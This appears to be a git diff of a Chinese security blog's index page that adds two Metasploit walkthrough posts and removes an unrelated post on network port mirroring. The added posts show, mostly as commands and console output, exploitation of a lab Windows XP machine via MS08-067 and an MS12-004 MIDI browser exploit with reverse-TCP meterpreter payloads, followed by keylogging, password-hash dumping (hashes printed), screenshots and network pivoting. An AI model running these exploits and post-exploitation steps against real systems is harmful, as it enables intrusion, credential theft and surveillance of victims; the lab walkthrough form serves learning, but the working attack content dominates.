@@ -184,6 +184,174 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Test-MS08-067" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Test-MS08-067/">Test-MS08-067</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Test-MS08-067/" class="archive-article-date">
+  	<time datetime="2016-08-10T13:44:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Kali2.0</div><div class="line">192.168.1.8</div><div class="line">W<span class="keyword">in</span>XPenSP3</div><div class="line">192.168.1.43</div></pre></td></tr></table></figure>
+<h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msf auxiliary(syn) &gt; use exploit/windows/smb/ms08_067_netapi</div><div class="line">msf exploit(ms08_067_netapi) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div></pre></td></tr></table></figure>
+<h1 id="Show-Option"><a href="#Show-Option" class="headerlink" title="Show Option"></a>Show Option</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms08_067_netapi) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/windows/smb/ms08_067_netapi):</div><div class="line"></div><div class="line">   Name     Current Setting  Required  Description</div><div class="line">   ----     ---------------  --------  -----------</div><div class="line">   RHOST                     yes       The target address</div><div class="line">   RPORT    445              yes       Set the SMB service port</div><div class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</div><div class="line"></div><div class="line"></div><div class="line">Payload options (windows/meterpreter/reverse_tcp):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="string">''</span>, seh, thread, process, none)</div><div class="line">   LHOST                      yes       The listen address</div><div class="line">   LPORT     4444             yes       The listen port</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Automatic Targeting</div></pre></td></tr></table></figure>
+<h1 id="Set-Option"><a href="#Set-Option" class="headerlink" title="Set Option"></a>Set Option</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms08_067_netapi) &gt; <span class="built_in">set</span> RhOST 192.168.1.43</div><div class="line">RhOST =&gt; 192.168.1.43</div><div class="line">msf exploit(ms08_067_netapi) &gt; <span class="built_in">set</span> LHOST 192.168.1.8</div><div class="line">LHOST =&gt; 192.168.1.8</div></pre></td></tr></table></figure>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms08_067_netapi) &gt; exploit</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.1.8:4444</div><div class="line">[*] Automatically detecting the target...</div><div class="line">[*] Fingerprint: Windows XP - Service Pack 3 - lang:English</div><div class="line">[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)</div><div class="line">[*] Attempting to trigger the vulnerability...</div><div class="line">[*] Sending stage (957487 bytes) to 192.168.1.43</div><div class="line">[*] Meterpreter session 1 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1115) at 2016-06-03 14:18:57 +0800</div><div class="line"></div><div class="line">meterpreter &gt; ls</div><div class="line">Listing: C:\WINDOWS\system32</div><div class="line">============================</div><div class="line"></div><div class="line">Mode              Size      Type  Last modified              Name</div><div class="line">----              ----      ----  -------------              ----</div><div class="line">100666/rw-rw-rw-  1482      fil   2011-08-14 13:40:01 +0800  <span class="variable">$winnt</span>$.inf</div><div class="line">40777/rwxrwxrwx   0         dir   2011-08-14 21:19:31 +0800  1025</div></pre></td></tr></table></figure>
+<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; shell</div><div class="line">Process 1004 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows XP [Version 5.1.2600]</div><div class="line">(C) Copyright 1985-2001 Microsoft Corp.</div><div class="line"></div><div class="line">C:\WINDOWS\system32&gt;ipconfig</div><div class="line">ipconfig</div><div class="line"></div><div class="line">Windows IP Configuration</div><div class="line"></div><div class="line"></div><div class="line">Ethernet adapter Local Area Connection:</div><div class="line"></div><div class="line">        Connection-specific DNS Suffix  . :</div><div class="line">        IP Address. . . . . . . . . . . . : 192.168.1.43</div><div class="line">        Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div class="line">        Default Gateway . . . . . . . . . : 192.168.1.1</div><div class="line"></div><div class="line">C:\WINDOWS\system32&gt;</div></pre></td></tr></table></figure>
+<h1 id="常用手法"><a href="#常用手法" class="headerlink" title="常用手法"></a>常用手法</h1><h2 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; screenshot</div><div class="line">Screenshot saved to: /root/Fyjiynwg.jpeg</div></pre></td></tr></table></figure>
+<h2 id="获取系统信息"><a href="#获取系统信息" class="headerlink" title="获取系统信息"></a>获取系统信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; sysinfo</div><div class="line">Computer        : DH-CA8822AB9589</div><div class="line">OS              : Windows XP (Build 2600, Service Pack 3).</div><div class="line">Architecture    : x86</div><div class="line">System Language : en_US</div><div class="line">Domain          : WORKGROUP</div><div class="line">Logged On Users : 2</div><div class="line">Meterpreter     : x86/win32</div></pre></td></tr></table></figure>
+<h2 id="目标系统正在运行的进程"><a href="#目标系统正在运行的进程" class="headerlink" title="目标系统正在运行的进程"></a>目标系统正在运行的进程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; ps</div><div class="line"></div><div class="line">Process List</div><div class="line">============</div><div class="line"></div><div class="line"> PID   PPID  Name                  Arch  Session  User                           Path</div><div class="line"> ---   ----  ----                  ----  -------  ----                           ----</div><div class="line"> 0     0     [System Process]                                                    </div><div class="line"> 4     0     System                x86   0        NT AUTHORITY\SYSTEM            </div><div class="line"> 128   676   VMUpgradeHelper.exe   x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\VMUpgradeHelper.exe</div><div class="line"> 560   4     smss.exe              x86   0        NT AUTHORITY\SYSTEM            \SystemRoot\System32\smss.exe</div></pre></td></tr></table></figure>
+<h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><blockquote>
+<p>使用migrate将会话迁移至explorer.exe(pid)进程中再启动keylog_recorder模块，需要终止时CTRL+C</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; migrate 1652</div><div class="line">[*] Migrating from 1032 to 1652...</div><div class="line">[*] Migration completed successfully.</div><div class="line">meterpreter &gt; run post/windows/capture/keylog_recorder</div><div class="line"></div><div class="line">[*] Executing module against DH-CA8822AB9589</div><div class="line">[*] Starting the keystroke sniffer...</div><div class="line">[*] Keystrokes being saved <span class="keyword">in</span> to /root/.msf7/loot/20160603143131_default_192.168.1.43_host.windows.key_581630.txt</div><div class="line">[*] Recording keystrokes...</div><div class="line">^C[*] Saving last few keystrokes...</div><div class="line">[*] Interrupt</div><div class="line">[*] Stopping keystroke sniffer...</div></pre></td></tr></table></figure>
+<h2 id="获取密码哈希值"><a href="#获取密码哈希值" class="headerlink" title="获取密码哈希值"></a>获取密码哈希值</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; hashdump</div><div class="line">Administrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</div><div class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</div><div class="line">HelpAssistant:1000:32f842845a64f17ccbe6b10315169b7e:83789c0d8506a618d815fd9c6fb379e1:::</div><div class="line">IUSR_DH-CA8822AB9589:1003:de8b8cec054052bb8ab2d451a3e61856:145f992fa5ff125301520f8e27419c6d:::</div><div class="line">IWAM_DH-CA8822AB9589:1004:90b05d38a1<span class="built_in">fc</span>8d80a4ae31c7bc961352:2f950167d2942f7c977fdfd1857b8a59:::</div><div class="line">SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bb5a5a239a6e521be591fdf091b05013:::</div><div class="line">meterprete</div></pre></td></tr></table></figure>
+<h2 id="将目标机器作为跳板"><a href="#将目标机器作为跳板" class="headerlink" title="将目标机器作为跳板"></a>将目标机器作为跳板</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; run get_local_subnets</div><div class="line">Local subnet: 192.168.1.0/255.255.255.0</div><div class="line">meterpreter &gt; background</div><div class="line">[*] Backgrounding session 1...</div><div class="line">msf exploit(ms08_067_netapi) &gt; route add 192.168.3.0 255.255.255.0 1</div><div class="line">[*] Route added</div><div class="line">msf exploit(ms08_067_netapi) &gt; route <span class="built_in">print</span></div><div class="line"></div><div class="line">Active Routing Table</div><div class="line">====================</div><div class="line"></div><div class="line">   Subnet             Netmask            Gateway</div><div class="line">   ------             -------            -------</div><div class="line">   192.168.3.0        255.255.255.0      Session 1</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Test-MS08-067/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Metasploit-MIDI文件解析远程代码执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Metasploit-MIDI文件解析远程代码执行/">Metasploit-MIDI文件解析远程代码执行</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Metasploit-MIDI文件解析远程代码执行/" class="archive-article-date">
+  	<time datetime="2016-08-09T14:40:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[*] Processing setup.rc <span class="keyword">for</span> ERB directives.</div><div class="line">resource (setup.rc)&gt; db_connect msf:msf123@127.0.0.1/msf</div><div class="line">resource (setup.rc)&gt; load msgrpc User=msf Pass=<span class="string">'abc123'</span></div><div class="line">[*] MSGRPC Service:  127.0.0.1:55552</div><div class="line">[*] MSGRPC Username: msf</div><div class="line">[*] MSGRPC Password: abc123</div><div class="line">[*] Successfully loaded plugin: msgrpc</div></pre></td></tr></table></figure>
+<h1 id="搜索和使用漏洞模块"><a href="#搜索和使用漏洞模块" class="headerlink" title="搜索和使用漏洞模块"></a>搜索和使用漏洞模块</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">msf &gt; search 12-004</div><div class="line">[!] Module database cache not built yet, using slow search</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                                   Disclosure Date  Rank    Description</div><div class="line">   ----                                   ---------------  ----    -----------</div><div class="line">   exploit/windows/browser/ms12_004_midi  2012-01-10       normal  MS12-004 midiOutPlayNextPolyEvent Heap Overflow</div><div class="line"></div><div class="line"></div><div class="line">msf &gt; use exploit/windows/browser/ms12_004_midi</div></pre></td></tr></table></figure>
+<h1 id="显示和设置相关Option"><a href="#显示和设置相关Option" class="headerlink" title="显示和设置相关Option"></a>显示和设置相关Option</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms12_004_midi) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/windows/browser/ms12_004_midi):</div><div class="line"></div><div class="line">   Name       Current Setting  Required  Description</div><div class="line">   ----       ---------------  --------  -----------</div><div class="line">   OBFUSCATE  <span class="literal">false</span>            no        Enable JavaScript obfuscation</div><div class="line">   SRVHOST    0.0.0.0          yes       The <span class="built_in">local</span> host to listen on. This must be an address on the <span class="built_in">local</span> machine or 0.0.0.0</div><div class="line">   SRVPORT    8080             yes       The <span class="built_in">local</span> port to listen on.</div><div class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL <span class="keyword">for</span> incoming connections</div><div class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</div><div class="line">   URIPATH                     no        The URI to use <span class="keyword">for</span> this exploit (default is random)</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Automatic</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> SRVHOST 192.168.1.8</div><div class="line">SRVHOST =&gt; 192.168.1.8</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> URIPATH /</div><div class="line">URIPATH =&gt; /</div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> LPORT 1234</div><div class="line">LPORT =&gt; 1234</div><div class="line">msf exploit(ms12_004_midi) &gt; exploit</div><div class="line">[*] Exploit running as background job.</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.1.8:1234</div><div class="line">[*] Using URL: http://192.168.1.8:8080/</div><div class="line">[*] Server started.</div></pre></td></tr></table></figure>
+<h1 id="使用目标主机IE浏览器打开URL后控制台输出为"><a href="#使用目标主机IE浏览器打开URL后控制台输出为" class="headerlink" title="使用目标主机IE浏览器打开URL后控制台输出为"></a>使用目标主机IE浏览器打开URL后控制台输出为</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">*] 192.168.1.43     ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Sending html to 192.168.1.43:2933...</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Request as: Windows-Media-Player/9.00.00.4503</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Sending midi corruption file...</div><div class="line">[*] Sending stage (957487 bytes) to 192.168.1.43</div><div class="line">[*] Meterpreter session 2 opened (192.168.1.8:1234 -&gt; 192.168.1.43:2934) at 2016-06-04 16:38:01 +0800</div><div class="line">[*] Session ID 2 (192.168.1.8:1234 -&gt; 192.168.1.43:2934) processing InitialAutoRunScript <span class="string">'migrate -f'</span></div><div class="line">[*] Current server process: iexplore.exe (372)</div><div class="line">[*] Spawning notepad.exe process to migrate to</div><div class="line">[+] Migrating to 3948</div><div class="line">[+] Successfully migrated to process</div></pre></td></tr></table></figure>
+<h1 id="查看和使用session"><a href="#查看和使用session" class="headerlink" title="查看和使用session"></a>查看和使用session</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">sf exploit(ms12_004_midi) &gt; sessions</div><div class="line"></div><div class="line">Active sessions</div><div class="line">===============</div><div class="line"></div><div class="line">  Id  Type                   Information                                      Connection</div><div class="line">  --  ----                   -----------                                      ----------</div><div class="line">  1   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:1234 -&gt; 192.168.1.43:2927 (192.168.1.43)</div><div class="line">  2   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:1234 -&gt; 192.168.1.43:2934 (192.168.1.43)</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; sessions -i 1</div><div class="line">[*] Starting interaction with 1...</div><div class="line"></div><div class="line">meterpreter &gt; ifconfig</div><div class="line"></div><div class="line">Interface  1</div><div class="line">============</div><div class="line">Name         : MS TCP Loopback interface</div><div class="line">Hardware MAC : 00:00:00:00:00:00</div><div class="line">MTU          : 1520</div><div class="line">IPv4 Address : 127.0.0.1</div><div class="line"></div><div class="line"></div><div class="line">Interface  2</div><div class="line">============</div><div class="line">Name         : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport</div><div class="line">Hardware MAC : 00:0c:29:84:07:87</div><div class="line">MTU          : 1500</div><div class="line">IPv4 Address : 192.168.1.43</div><div class="line">IPv4 Netmask : 255.255.255.0</div><div class="line"></div><div class="line">meterpreter &gt; shell</div><div class="line">Process 204 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows XP [Version 5.1.2600]</div><div class="line">(C) Copyright 1985-2001 Microsoft Corp.</div><div class="line"></div><div class="line">C:\Documents and Settings\Administrator\Desktop&gt;</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Metasploit-MIDI文件解析远程代码执行/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-OSSIM-新建邮件提醒" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1151,185 +1319,6 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-旁路镜像、端口镜像、旁路监控" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/devops/旁路镜像、端口镜像、旁路监控/">旁路镜像、端口镜像、旁路监控</a>
-    </h1>
-  
-
-        
-        <a href="/devops/旁路镜像、端口镜像、旁路监控/" class="archive-article-date">
-  	<time datetime="2016-03-20T02:27:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-03-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="常见的网络监控模式可以分为两种"><a href="#常见的网络监控模式可以分为两种" class="headerlink" title="常见的网络监控模式可以分为两种"></a>常见的网络监控模式可以分为两种</h1><blockquote>
-<p>一种是旁路监控模式<br> 另一种是串联监控模式。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。</div></pre></td></tr></table></figure>
-<h2 id="旁路模式的优缺点"><a href="#旁路模式的优缺点" class="headerlink" title="旁路模式的优缺点"></a>旁路模式的优缺点</h2><blockquote>
-<p>优点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">旁路监控模式部署起来比较灵活方便，只需要在交换机上面配置镜像端口即可。不会影响现有的网络结构。而串联模式一般要作为网关、网桥或者代理服务器，所以需要对现有网络结构进行变动。</div><div class="line">旁路模式分析的是镜像端口拷贝过来的数据，对原始传递的数据包不会造成延时，不会对网速造成任何影响。而串联模式是串联在网络中的，那么所有的数据必须先经过监控系统，通过监控系统的分析检查之后，才能够发送到各个客户端，所以会对网速有一定的延时。</div><div class="line">旁路监控设备一旦故障或者停止运行，不会影响现有网络。而串联监控设备如果出现故障，会导致网络中断。</div></pre></td></tr></table></figure></p>
-<p>缺点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">需要交换机或者路由支持“端口镜像”功能才可以实现监控。</div><div class="line">旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，一般还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在该问题。</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h2 id="串联模式的优缺点"><a href="#串联模式的优缺点" class="headerlink" title="串联模式的优缺点"></a>串联模式的优缺点</h2><blockquote>
-<p>优点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">利用windows自带的“网关”、“网桥”功能即可实现，不需要硬件设备的支持。</div><div class="line">可以禁止UDP通讯数据包。</div></pre></td></tr></table></figure></p>
-<p>缺点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">需要更改现有的网络结构。</div><div class="line">与“旁路监控”相比较，“网关”、“网桥”的配置更加复杂些。</div><div class="line">由于是串联模式，当局域网电脑台数多时，对网速有少许的影响。这个主要取决于电脑的硬件配置。</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h2 id="交换机镜像端口配置"><a href="#交换机镜像端口配置" class="headerlink" title="交换机镜像端口配置"></a>交换机镜像端口配置</h2><blockquote>
-<p>用户模式：查看初始化相关信息<br>特权模式：查看所有信息、调试、保持配置信息<br>全局模式：配置所有信息、针对整个路由器或交换机的所有接口<br>接口模式：针对某一个接口的配置<br>线控模式：对路由器进行控制的接口配置</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sw-1#show monitor      检查是否已存在镜像的配置</div><div class="line">sw-1#conf t                    进入全局模式</div><div class="line">sw-1&lt;config&gt;#monitor session 2 source int f0/12 both         监控端口f0/12（外网口或叫被镜像端口）  both代表双向监听数据   rx代表接收数据   tx代表发送数据</div><div class="line">sw-1&lt;config&gt;#monitor session 2 destination int f0/24         把信息复制到f0/24（镜像端口）</div><div class="line">sw-1&lt;config&gt;#end        返回</div><div class="line">sw-1#show monitor session 2</div><div class="line">把F0/12 进来的出去的数据复制一份给F0/24，这样我们在晟为就可以截取到数据了。</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">others</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/devops/" class="article-tag-list-link color2">devops</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/devops/旁路镜像、端口镜像、旁路监控/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-Centos-vsftpd" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/devops/Centos-vsftpd/">Centos vsftpd</a>
-    </h1>
-  
-
-        
-        <a href="/devops/Centos-vsftpd/" class="archive-article-date">
